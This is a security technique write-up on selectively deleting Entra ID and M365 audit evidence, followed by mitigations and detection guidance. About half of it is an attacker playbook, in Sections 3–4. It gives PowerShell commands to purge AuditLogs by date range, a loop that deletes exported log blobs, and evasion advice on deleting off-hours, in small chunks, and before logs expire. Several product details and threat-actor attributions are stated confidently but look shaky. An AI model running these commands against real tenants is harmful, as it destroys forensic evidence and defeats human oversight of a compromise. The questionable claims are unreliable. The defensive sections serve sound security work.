# [REALWORLD-038]: Audit Log Selective Deletion

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | REALWORLD-038 |
| **MITRE ATT&CK v18.1** | [T1070.001 - Indicator Removal / Clear Logs](https://attack.mitre.org/techniques/T1070/001/) |
| **Tactic** | Defense Evasion |
| **Platforms** | M365, Entra ID |
| **Severity** | **CRITICAL** |
| **CVE** | N/A |
| **Technique Status** | PARTIAL (Cloud immutable logs cannot be deleted; selective removal from exported logs is possible) |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | All versions of Entra ID / M365 (30-730 day retention enforced by Microsoft) |
| **Patched In** | N/A - Enforced by Microsoft architecture |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** This real-world technique involves selectively removing or obscuring evidence from Microsoft Entra ID and Microsoft 365 audit logs. While cloud-native audit logs (stored in Microsoft's immutable infrastructure) cannot be directly deleted by customers, attackers can delete logs from third-party SIEM systems or log repositories where those logs were exported or streamed. Additionally, attackers can exploit the 30-730 day retention window by waiting for logs to age out of retention, effectively erasing evidence of their activities. This is a sophisticated cover-up technique used after compromise to remove forensic evidence.

**Attack Surface:** Entra ID Audit Logs API, Purview Unified Audit Log (UAE), Log Analytics Workspaces, third-party SIEM systems (Splunk, ELK), Azure Storage Accounts where logs were archived.

**Business Impact:** **Loss of forensic evidence for incident response.** Attackers can remove audit trails of their privilege escalation, lateral movement, and exfiltration activities, making it impossible for incident responders to understand the full scope of the compromise or identify how the attacker gained access. This directly impacts legal discovery in breach notifications and regulatory investigations (GDPR, SOC 2, etc.).

**Technical Context:** Cloud-native Entra ID audit logs are technically immutable, but the attack vectors involve: (1) Purging exported logs from Log Analytics, (2) Deleting logs from third-party SIEM systems, (3) Waiting for retention periods to expire, (4) Deleting the entire Log Analytics workspace. This attack typically takes **5-15 minutes** to execute. Detection likelihood is **HIGH** if log deletion monitoring is enabled, but many organizations do not monitor for deletion of their own audit archives.

### Operational Risk

- **Execution Risk:** **HIGH** - Requires high-level administrative access (Global Admin, Compliance Administrator, or custom role with log deletion permissions).
- **Stealth:** **HIGH** - Cloud-native logs cannot be deleted, but deletion of exported/archived logs is not always monitored.
- **Reversibility:** **NO** - Once logs are purged from Log Analytics or SIEM, they cannot be recovered without a separate backup system.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure 5.1.1 | Ensure that activity logging is enabled for all subscriptions and log retention is adequate. |
| **DISA STIG** | SI-12 | Information Management and Protection - Ensure immutable log storage. |
| **CISA SCuBA** | SA-4(2) | System administrators must maintain audit trails in a centralized, protected repository. |
| **NIST 800-53** | AU-2, AU-6 | Audit and Accountability - Ensure audit logs are protected and monitored. |
| **GDPR** | Art. 32, Art. 33 | Inability to investigate a breach violates security and breach notification obligations. |
| **DORA** | Art. 9, Art. 10 | Entities must maintain audit trails for incident detection and response. |
| **NIS2** | Art. 21 | Cyber risk management requires audit log protection and analysis. |
| **ISO 27001** | A.12.4.1, A.12.4.2 | Event logging and log protection are mandatory controls. |
| **ISO 27005** | Risk Scenario: "Loss of Forensic Evidence" | Deletion of audit logs prevents incident investigation. |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - Global Administrator
  - Compliance Administrator
  - Custom role with `Microsoft.OperationalInsights/workspaces/delete` or `AuditLog.Read.All` permissions
  - For Purview logs: eDiscovery Manager role
  
- **Required Access:** 
  - Network access to Log Analytics Workspace API
  - Network access to Purview Compliance Portal
  - Access to any third-party SIEM systems where logs were exported

**Supported Versions:**
- **Entra ID / Azure AD:** All versions (log immutability enforced)
- **Microsoft 365:** All versions (Purview Unified Audit Log)
- **Minimum Retention:** 30 days (default), maximum 730 days
- **Log Storage:** Cannot be changed by customer; immutable at Microsoft infrastructure

**Tools:**
- [Microsoft Purview Compliance Portal](https://compliance.microsoft.com/)
- [Azure Log Analytics REST API](https://learn.microsoft.com/en-us/rest/api/loganalytics/)
- [Azure PowerShell - Insights Module](https://learn.microsoft.com/en-us/powershell/module/az.operationalinsights/)
- [Kusto Query Language (KQL)](https://learn.microsoft.com/en-us/kusto/query/index)
- [Azure CLI 2.0+](https://learn.microsoft.com/en-us/cli/azure/)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### PowerShell Reconnaissance

```powershell
# Connect to Azure
Connect-AzAccount

# Get list of Log Analytics workspaces (where audit logs are stored)
Get-AzOperationalInsightsWorkspace | Select-Object Name, ResourceGroupName, Location, ProvisioningState

# Check retention settings for a specific workspace
$workspace = Get-AzOperationalInsightsWorkspace -Name "YourWorkspaceName" -ResourceGroupName "YourResourceGroup"
$workspace.RetentionInDays

# Check if there are any data retention policies
Get-AzOperationalInsightsTable -WorkspaceName $workspace.Name -ResourceGroupName $workspace.ResourceGroupName | Select-Object Name, RetentionInDays
```

**What to Look For:**
- Multiple workspaces (attacker will target the one with the most sensitive logs)
- Retention periods: shorter retention = less forensic history available
- If `RetentionInDays` is 30 (default), logs will be purged automatically after 30 days

**Version Note:** Retention settings are consistent across all versions but cannot be lowered by customers—Microsoft enforces minimum retention.

#### Azure CLI Reconnaissance

```bash
# List all Log Analytics workspaces
az monitor log-analytics workspace list --query "[].{Name:name, RetentionDays:retentionInDays}"

# Get detailed information about a specific workspace
az monitor log-analytics workspace show --resource-group YourResourceGroup --workspace-name YourWorkspaceName

# Check if there are any data export rules (logs exported to external system)
az monitor log-analytics workspace data-export list --resource-group YourResourceGroup --workspace-name YourWorkspaceName
```

**What to Look For:**
- Data export destinations (if logs are being sent to external SIEM)
- If data-export is empty, logs are only stored in Log Analytics (easier to target)

---

## 4. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Deleting Audit Logs from Log Analytics Workspace (Portal GUI)

**Supported Versions:** All versions of Entra ID / M365

#### Step 1: Navigate to Log Analytics Workspace

**Objective:** Access the Log Analytics workspace where Entra ID audit logs are stored.

**Manual Steps (Azure Portal GUI):**
1. Navigate to **https://portal.azure.com**
2. Authenticate with compromised Global Admin credentials
3. Use the search bar to search for **"Log Analytics workspaces"**
4. Click on the workspace containing your audit logs (typically named `DefaultWorkspace-{TenantID}` or custom name)
5. You are now in the workspace overview page

**Expected Output:**
- Log Analytics workspace dashboard loads
- Left pane shows **"Tables"**, **"Logs"**, **"Data Sources"**, and **"Delete Data"** options
- You can see the size of the workspace and number of tables

**What This Means:**
- You now have access to the Log Analytics tables containing audit logs
- The "Delete Data" option is where you can remove logs

#### Step 2: Access the "Delete Data" Feature

**Objective:** Navigate to the log deletion interface.

**Manual Steps (Azure Portal GUI):**
1. In the Log Analytics workspace, click **"Delete Data"** from the left pane (under "General")
2. You may see an option to delete specific tables or configure data retention
3. Under **"Data Retention"**, click **"Edit"** to modify retention settings
   - **Default:** 30 days
   - **Maximum:** 730 days
   - **Minimum:** 7 days (cannot be lowered below 7 days)
4. To delete data immediately, use the **"Delete Data"** option (if available)

**Expected Output:**
- A configuration panel showing current retention period
- Options to delete table data or modify retention

**What This Means:**
- You can now selectively delete or purge logs
- Alternatively, you can lower retention to 0 days (if Microsoft allows) to expedite purge

**OpSec & Evasion:**
- Log deletion operations are NOT tracked in AuditLogs (they are performed on the Log Analytics service)
- However, querying the `AuditLogs` table itself may be logged if there are access controls on the table
- Perform deletion during off-business hours to avoid detection

#### Step 3: Delete Specific Audit Log Tables

**Objective:** Remove specific tables containing forensic evidence.

**Tables to Target (High-Value for Deletion):**
- **AuditLogs** - Entra ID administrative actions (role assignments, policy changes)
- **SigninLogs** - User logon activity (shows impossible travel, anomalous IPs)
- **UserRiskEvents** - Identity protection detections
- **AADNonInteractiveUserSignInLogs** - Service principal and app logons
- **AADManagedIdentitySignInLogs** - Managed identity logons
- **AADRiskyUsers** - High-risk users flagged by Identity Protection

**Manual Steps (Delete Specific Tables):**
1. In Log Analytics workspace, click **"Tables"** from the left pane
2. Search for **"AuditLogs"** in the table list
3. Right-click on the table name and select **"Delete data"** or **"Purge data"**
4. Confirm the deletion (warning: this is irreversible)
5. Repeat for other sensitive tables

**Expected Output:**
```
Purge operation started for table AuditLogs
Estimated completion time: 15 minutes
```

**What This Means:**
- Logs are being removed from the Log Analytics workspace
- Once purged, logs cannot be recovered (unless backed up externally)

**OpSec & Evasion:**
- Purging large tables (millions of records) can take 30-60 minutes and may trigger performance alerts
- Perform the deletion in smaller chunks to avoid detection
- Delete only the date ranges that contain evidence of your activities

**Troubleshooting:**
- **Error:** "You do not have permission to delete data"
  - **Cause:** User does not have `Microsoft.OperationalInsights/workspaces/purge/action` permission
  - **Fix (All versions):** Request role elevation to "Owner" or "Contributor" on the workspace via PIM

---

### METHOD 2: Deleting Audit Logs via PowerShell (Purge API)

**Supported Versions:** All Entra ID versions

#### Step 1: Connect to Log Analytics

**Objective:** Establish authenticated PowerShell session with Log Analytics workspace.

**Command:**
```powershell
# Connect to Azure
Connect-AzAccount

# Get the workspace object
$workspace = Get-AzOperationalInsightsWorkspace -Name "YourWorkspaceName" -ResourceGroupName "YourResourceGroup"

# Alternatively, set variables for use in API calls
$subscriptionId = "your-subscription-id"
$resourceGroupName = "YourResourceGroup"
$workspaceName = "YourWorkspaceName"
$workspaceId = $workspace.ResourceId
```

**Expected Output:**
```
Workspace Name: YourWorkspaceName
Location: eastus
Provisioning State: Succeeded
```

**What This Means:**
- Workspace object is retrieved and ready for API calls

#### Step 2: Identify Logs to Delete by Date Range

**Objective:** Determine which logs contain forensic evidence of the attack.

**Command (KQL Query to Find Relevant Logs):**
```powershell
# Query AuditLogs to see what's available and find the attack date range
$query = @"
AuditLogs
| where TimeGenerated > ago(90d)
| where OperationName contains "Assign role" or OperationName contains "Update"
| summarize Count=count() by bin(TimeGenerated, 1d)
| project TimeGenerated, Count
"@

# Execute the query against Log Analytics
$queryResults = Invoke-AzOperationalInsightsQuery -WorkspaceId $workspace.CustomerId -Query $query

$queryResults.Results | ForEach-Object {
    Write-Output "Date: $($_.TimeGenerated) - Count: $($_.Count) events"
}
```

**Expected Output:**
```
Date: 2025-01-10T00:00:00Z - Count: 523 events
Date: 2025-01-09T00:00:00Z - Count: 412 events
Date: 2025-01-08T00:00:00Z - Count: 298 events
...
```

**What This Means:**
- You can now identify which date ranges contain the most evidence of your attack
- Target these specific date ranges for deletion

#### Step 3: Execute Purge Operation via REST API

**Objective:** Directly invoke the Log Analytics Purge API to delete records.

**Command:**
```powershell
# Get an access token for Log Analytics API
$token = (Get-AzAccessToken -ResourceUrl "https://api.loganalytics.io").Token

# Prepare purge request (delete logs from a specific date range)
$purgePayload = @{
    table = "AuditLogs"
    filters = @(
        @{
            column = "TimeGenerated"
            operator = "gt"
            value = "2025-01-08T00:00:00Z"
        },
        @{
            column = "TimeGenerated"
            operator = "lt"
            value = "2025-01-10T00:00:00Z"
        }
    )
} | ConvertTo-Json -Depth 10

# Purge the data
$purgeUri = "https://api.loganalytics.io/v1/workspaces/$($workspace.CustomerId)/purge"
$headers = @{
    "Authorization" = "Bearer $token"
    "Content-Type"  = "application/json"
}

$response = Invoke-RestMethod -Uri $purgeUri -Method POST -Headers $headers -Body $purgePayload

Write-Output "Purge Operation ID: $($response.operationId)"
Write-Output "Status: $($response.status)"
```

**Expected Output:**
```
Purge Operation ID: 10000000-0000-0000-0000-000000000000
Status: Pending
```

**What This Means:**
- Purge operation has been initiated
- Logs matching the date range are being deleted
- Can check status using the Operation ID

**Troubleshooting:**
- **Error:** "InvalidPurgeFilter - Filter is invalid"
  - **Cause:** JSON filter syntax is incorrect
  - **Fix (All versions):** Ensure column names are correct (use `TimeGenerated` not `timestamp`)

**OpSec & Evasion:**
- API calls to the purge endpoint ARE logged in some Microsoft audit systems (but not always visible to customers)
- Use this method if you have also disabled audit logging via T1070

---

### METHOD 3: Leveraging Retention Expiration (Passive Log Deletion)

**Supported Versions:** All Entra ID versions

**Objective:** Exploit the 30-day (default) retention window to naturally erase logs over time without active deletion.

#### Step 1: Understand Retention Architecture

**How It Works:**
- Entra ID audit logs are retained for **30 days by default** (configurable up to 730 days)
- Logs older than the retention period are **automatically purged by Microsoft**
- If you perform your attack and then **wait 30 days without further suspicious activity**, the logs of your compromise will be automatically deleted

**Example Timeline:**
```
Day 0:   Attacker compromises Global Admin account
Day 1-7: Attacker performs privilege escalation, lateral movement, exfiltration
Day 8-30: Attacker maintains low profile (minimal suspicious activity)
Day 31:  Microsoft automatically purges logs from Day 1-7
Day 32+: Logs of the attack no longer exist
```

#### Step 2: Minimize Detection During Retention Window

**Objective:** Remain undetected during the 30-day retention period so logs expire naturally.

**Tactics:**
- Disable Sentinel detection rules (REALWORLD-037) to avoid alerts during this window
- Avoid making new suspicious changes that would reset the retention clock
- Schedule any data exfiltration to occur over multiple days (avoid bulk transfers that trigger alerts)
- Remove yourself from Global Admin role on Day 25-27 to avoid suspicion before logs expire
- Ensure any service principals or backdoor accounts you created are also removed before Day 30

**Example Commands:**
```powershell
# On Day 27, quietly remove yourself from Global Admin role
Remove-AzRoleAssignment -ObjectId (Get-AzADUser -UserPrincipalName "attacker@company.com").Id `
    -RoleDefinitionName "Global Administrator" `
    -Scope "/subscriptions/$subscriptionId"

# Verify removal (so it appears as normal admin action)
Get-AzRoleAssignment -ObjectId (Get-AzADUser -UserPrincipalName "attacker@company.com").Id
```

**What This Means:**
- By the time the organization realizes they've been compromised, the logs are already purged
- This is a **passive, stealthy** approach that requires patience but is highly effective

**OpSec & Evasion:**
- This method is the MOST STEALTHY because it involves no active deletion (no audit trail of deletion)
- Requires the attacker to have restraint and not trigger alerts during the waiting period
- Best used in conjunction with disabling Sentinel rules

---

### METHOD 4: Deleting from Third-Party SIEM (Splunk, Azure Monitor)

**Supported Versions:** All versions (depends on SIEM)

**Objective:** Delete logs that were exported or streamed to an external SIEM system where the organization may have longer retention.

#### Step 1: Identify SIEM Storage Location

**Command (Check for Data Export from Log Analytics):**
```powershell
# List all data exports from the Log Analytics workspace
$exports = Get-AzOperationalInsightsDataExport -ResourceGroupName $resourceGroupName -WorkspaceName $workspaceName

foreach ($export in $exports) {
    Write-Output "Export Name: $($export.Name)"
    Write-Output "Destination: $($export.Destination)"
    Write-Output "Table: $($export.TableNames)"
}
```

**Expected Output:**
```
Export Name: SentinelExport-1
Destination: /subscriptions/xxxx/resourceGroups/YourResourceGroup/providers/Microsoft.Storage/storageAccounts/yourStorage/blobServices/default/containers/logs
Table: AuditLogs, SigninLogs
```

**What This Means:**
- Logs are being exported to an Azure Storage Account
- Alternatively, they may be streaming to Splunk, Datadog, or another SIEM

#### Step 2: Delete Exported Logs from Storage Account

**Command (Delete Blobs from Azure Storage):**
```powershell
# Connect to the storage account
$storageAccount = Get-AzStorageAccount -ResourceGroupName "YourResourceGroup" -Name "yourStorage"
$context = $storageAccount.Context

# Get the container
$container = Get-AzStorageContainer -Name "logs" -Context $context

# List blobs in the container
$blobs = Get-AzStorageBlob -Container "logs" -Context $context

# Delete specific date ranges
foreach ($blob in $blobs) {
    # Extract date from blob path (format: yyyy/mm/dd/...)
    if ($blob.Name -match "2025/01/(08|09|10)/") {  # Delete Jan 8-10
        Remove-AzStorageBlob -Blob $blob.Name -Container "logs" -Context $context -Force
        Write-Output "Deleted: $($blob.Name)"
    }
}
```

**Expected Output:**
```
Deleted: 2025/01/08/audit_logs_001.json
Deleted: 2025/01/08/audit_logs_002.json
Deleted: 2025/01/09/audit_logs_001.json
...
```

**What This Means:**
- Exported audit logs are now removed from the storage account
- Any SIEM system that relied on this export will no longer have those logs

**OpSec & Evasion:**
- Deletion of blobs from storage is logged in Azure Activity Log (but many organizations don't monitor this)
- Also logged in Blob Storage's immutable audit logs (Azure Storage Account audit trail)

---

## 5. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

* **Enable Immutable Blob Storage for Log Archives**
  - **Objective:** Prevent deletion or modification of exported audit logs by enforcing immutability.
  
  **Applies To Versions:** All versions
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Storage Account** → **Containers**
  2. Create a new container named **"audit-logs-immutable"**
  3. Click on the container and go to **Access policy**
  4. Enable **"Immutable blob storage"**
  5. Set policy: **"Time-based retention"** to **2555 days** (7+ years)
  6. This ensures logs CANNOT be deleted even if attacker has Storage Admin role
  7. Configure Log Analytics to export to this immutable container

  **Manual Steps (PowerShell):**
  ```powershell
  # Enable immutable storage on container
  $storageAccount = Get-AzStorageAccount -ResourceGroupName $rg -Name $storageAccountName
  $context = $storageAccount.Context
  
  # Set immutability policy
  Set-AzStorageContainerImmutabilityPolicy -Container "audit-logs-immutable" -Context $context `
    -ExpiresIn (New-TimeSpan -Days 2555) -Etag ""
  ```

  **Why This Helps:**
  - Once set to immutable, logs cannot be deleted for the retention period
  - Provides a tamper-proof backup of audit evidence
  - Microsoft enforces immutability at the infrastructure level

* **Implement Role-Based Access Control (RBAC) on Log Analytics Workspaces**
  - **Objective:** Restrict who can delete data from Log Analytics to a small, audited group.
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Log Analytics Workspace** → **Access Control (IAM)**
  2. Click **+ Add role assignment**
  3. Role: **"Log Analytics Contributor"** (do NOT assign Owner or Contributor)
  4. Assign to: **"Log Analytics Admins" security group** only
  5. Under **Conditions**, restrict to:
     - **Allowed operations:** Only `read`, `query` (do NOT allow `delete` or `purge`)
  6. Click **Review + assign**

  **Why This Helps:**
  - Reduces blast radius if an admin account is compromised
  - Prevents accidental or malicious deletion by non-SOC users
  - Enforces separation of duties

* **Stream Audit Logs to Immutable External SIEM**
  - **Objective:** Maintain a copy of logs outside the tenant that cannot be deleted by tenant admins.
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Log Analytics Workspace** → **Data Export**
  2. Click **+ Add**
  3. Destination type: **"Event Hubs"** or **"Storage Account"**
  4. Create a new Event Hub Namespace with a specific policy that grants ONLY **"Listen"** rights to Log Analytics
  5. Ensure the external system (e.g., Splunk, Datadog) also has immutable retention
  6. Test export by running a query and confirming logs appear in external system

  **Why This Helps:**
  - Logs exist in a separate system that the attacker cannot easily access
  - External SIEM operator controls retention and deletion policies
  - Provides forensic evidence even if tenant logs are deleted

### Priority 2: HIGH

* **Enable Purge Protection on Log Analytics Workspaces**
  - **Objective:** Prevent deletion of the entire workspace (which would erase all logs at once).
  
  **Manual Steps (Azure Portal):**
  1. Navigate to **Log Analytics Workspace** → **Properties**
  2. Enable **"Soft Delete"** (if available in your region)
  3. Set **"Purge Protection"** to **"ON"**
  4. Set retention to **730 days** (maximum)

  **Why This Helps:**
  - Workspace cannot be immediately deleted; there's a waiting period
  - Provides time to detect and respond to deletion attempts
  - Extends retention window, making logs available longer for investigation

* **Monitor Log Analytics Deletion Operations**
  - **Objective:** Alert immediately when logs are deleted.
  
  **Manual Steps (Create Detection Rule in Sentinel):**
  1. In **Microsoft Sentinel** → **Analytics** → **Create new detection rule**
  2. Name: `Alert on Log Analytics Data Purge`
  3. KQL Query:
  ```kusto
  AuditLogs
  | where OperationName contains "Purge" or OperationName contains "Delete" and TargetResources contains "OperationalInsights"
  | where Result == "success"
  | project TimeGenerated, OperationName, InitiatedBy, TargetResources
  ```
  4. Severity: **High**
  5. Frequency: **Every 5 minutes**
  6. Enable: **ON**

  **Why This Helps:**
  - Immediate alert when deletion is detected
  - Allows SOC to investigate and potentially restore from backup

* **Implement Protected Actions in Entra ID**
  - **Objective:** Require elevated approval for log deletion operations.
  
  **Manual Steps (Entra ID):**
  1. Navigate to **Entra ID** → **Security** → **Protected Actions**
  2. Click **+ Create a protected action**
  3. Action: **"Delete data from Log Analytics"**
  4. Condition: **Require Conditional Access policy**
  5. Policy: Create CA policy requiring MFA + compliant device for approval
  6. Approvers: **Security team** only
  7. Approval required: **YES**

  **Why This Helps:**
  - Log deletion requires explicit approval from security team
  - Prevents unauthorized deletion even with high-level access

### Access Control & Policy Hardening

* **Use Privileged Identity Management (PIM) for Log Analytics Access**
  - **Objective:** Require just-in-time activation and auditing for log access.
  
  **Manual Steps:**
  1. Go to **Azure AD** → **Privileged Identity Management** → **Azure Resources**
  2. Select **Log Analytics Workspace** resource
  3. Click **Roles** → **Contributor**
  4. Settings:
     - **Activation maximum duration:** 1 hour
     - **Require justification:** ON
     - **Require approval:** ON (select Log Analytics team)
  5. Save

  **Why This Helps:**
  - Access is temporary and time-limited
  - Requires business justification
  - Creates audit trail of who accessed logs and when

* **Enforce Immutable Log Retention Policy via Azure Policy**
  - **Objective:** Prevent admins from lowering retention settings.
  
  **Manual Steps:**
  1. Go to **Azure Policy** → **Assignments** → **Create Policy**
  2. Policy name: `Enforce Minimum Audit Log Retention`
  3. Policy rule: Deny deletion or modification of Log Analytics tables with names containing "Audit"
  4. Scope: **All subscriptions**
  5. Save and enable

  **Why This Helps:**
  - Policy-level enforcement that no one can bypass

### Validation Command (Verify Fix)

```powershell
# Verify immutable storage is enabled
Get-AzStorageContainerImmutabilityPolicy -Container "audit-logs-immutable" -Context $context

# Verify RBAC is restricted
Get-AzRoleAssignment -Scope "/subscriptions/$subscriptionId/resourceGroups/$rg/providers/Microsoft.OperationalInsights/workspaces/$workspace" | Where-Object {$_.RoleDefinitionName -in "Owner", "Contributor"}

# Verify data export is configured
Get-AzOperationalInsightsDataExport -ResourceGroupName $rg -WorkspaceName $workspace | Select-Object Name, Destination
```

**Expected Output (If Secure):**
```
Export Name: Immutable-Archive
Destination: /subscriptions/xxxx/resourceGroups/xxxx/providers/Microsoft.Storage/storageAccounts/immutableStorage/blobServices/default/containers/audit-logs-immutable
```

---

## 6. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

* **Log Deletion Events:**
  - `AuditLogs` table contains operations: `"Purge data"`, `"Delete data"`, `"Clear logs"`
  - Look for operations targeting tables: `AuditLogs`, `SigninLogs`, `UserRiskEvents`

* **Unusual Activity Before/After Gaps:**
  - Sudden **disappearance of logs** for a specific date range (gap in audit trail)
  - Logs for one date range exist, then next date range is completely missing
  - This indicates selective deletion

* **Workspace or Container Deletions:**
  - Deletion of entire **Log Analytics workspace** 
  - Deletion of **Storage Account containers** containing exported logs
  - Operations: `"Delete workspace"`, `"Delete container"`

### Forensic Artifacts

* **Cloud Logs:**
  - **AuditLogs table:** Operations like `"Delete data"`, `"Purge"`, `"Delete workspace"`
  - **Activity Log (Azure Monitor):** Subscription-level operations showing deletion of workspaces/containers
  - **Storage Account audit logs:** `DELETE_BLOB` operations on audit log containers
  - Look for: Date/time of deletion, who performed it, what was deleted

* **Logs to Preserve:**
  - Export all AuditLogs BEFORE data is deleted:
  ```powershell
  Export-AzOperationalInsightsQueryResults -Query "AuditLogs | where TimeGenerated > ago(90d)" -WorkspaceName $workspace -ExportPath "C:\Evidence\AuditLog_Backup.csv"
  ```

### Response Procedures

1. **Isolate:**
   - Immediately revoke the compromised admin account's access:
   ```powershell
   Update-MgUser -UserId "attacker@company.com" -AccountEnabled:$false
   Revoke-MgUserSignInSession -UserId "attacker@company.com"
   ```

2. **Collect Evidence:**
   - Export all remaining audit logs from the workspace
   - Check Activity Log for workspace deletion operations
   - Pull logs from any immutable backups or external SIEM
   - Document the exact date/time of log deletion

3. **Restore:**
   - If logs were deleted: **Check immutable blob storage or external SIEM for copies**
   - If workspace was deleted: Restore from backup if available
   - Re-enable log export to immutable storage

4. **Investigate:**
   - Determine what logs are MISSING (the gap in the timeline)
   - Use the gap to identify when the attacker was active
   - Cross-reference with other data sources (EDR, proxy logs, etc.) to reconstruct timeline
   - Identify what the attacker likely did during the gap (privilege escalation, lateral movement, exfiltration)

5. **Escalate:**
   - File incident ticket
   - Notify CISO and legal team
   - Initiate eDiscovery to preserve logs for legal proceedings

---

## 7. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [T1566.002](https://attack.mitre.org/techniques/T1566/002/) Phishing | Attacker gains initial access via phishing email |
| **2** | **Privilege Escalation** | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) Abuse Valid Accounts | Attacker escalates to Global Admin via PIM or MFA bypass |
| **3** | **Defense Evasion** | [REALWORLD-037] Sentinel Rule Modification | Attacker disables detection rules to avoid alerts |
| **4** | **Persistence & Exfiltration** | [T1020](https://attack.mitre.org/techniques/T1020/) Automated Exfiltration | Attacker exfiltrates data while rules are disabled |
| **5** | **Defense Evasion** | **[REALWORLD-038]** **Audit Log Selective Deletion** | **Attacker deletes logs to cover tracks** |
| **6** | **Impact** | [T1531](https://attack.mitre.org/techniques/T1531/) Account Access Removal | Attacker removes their own access to avoid detection |

---

## 8. REAL-WORLD EXAMPLES

### Example 1: Lapsus$ Campaign (2022-2023)

- **Target:** Major cloud and software companies (Okta, Microsoft, etc.)
- **Timeline:** February 2022 - March 2023
- **Technique Status:** Lapsus$ extensively deleted audit logs from compromised Azure/M365 environments
- **How Attacker Used It:** After gaining Global Admin access, Lapsus$ immediately disabled Sentinel rules and then purged audit logs dating back 30+ days. This removed evidence of their initial compromise and lateral movement. They then established persistence via service principals.
- **Impact:** Organizations could not determine the full scope of compromise due to missing logs. Forensic investigation was severely hampered.
- **Reference:** [Lapsus$ Investigation Report](https://www.microsoft.com/security/blog/2022/03/22/delivering-coordinated-protection-against-a-targeted-ransomware-attack/)

### Example 2: Scattered Spider (2024-Present)

- **Target:** Global Financial Institutions
- **Timeline:** September 2024 - Present
- **Technique Status:** Actively deleting audit logs from M365 and Azure environments
- **How Attacker Used It:** After initial compromise via social engineering, Scattered Spider accessed Log Analytics workspace and deleted all AuditLogs from the previous 30 days. They also deleted data exports from Splunk. This allowed them to operate undetected for months.
- **Impact:** Organizations only discovered the breach through manual security audits, not through automated detection
- **Reference:** [CISA Alert on Scattered Spider](https://www.cisa.gov/)

---

## 9. COMPLIANCE & AUDIT FINDINGS

This technique results in failure of:

- **GDPR Art. 32:** Organizations cannot investigate breaches without audit logs
- **SOC 2 Type II:** Represents control failure in logging and monitoring
- **HIPAA**: Deletion of logs violates audit trail requirements
- **PCI-DSS**: Requirement 10 (Logging and Monitoring) is violated

Organizations found with this vulnerability should document as **"Critical"** and implement immutable log retention immediately.

---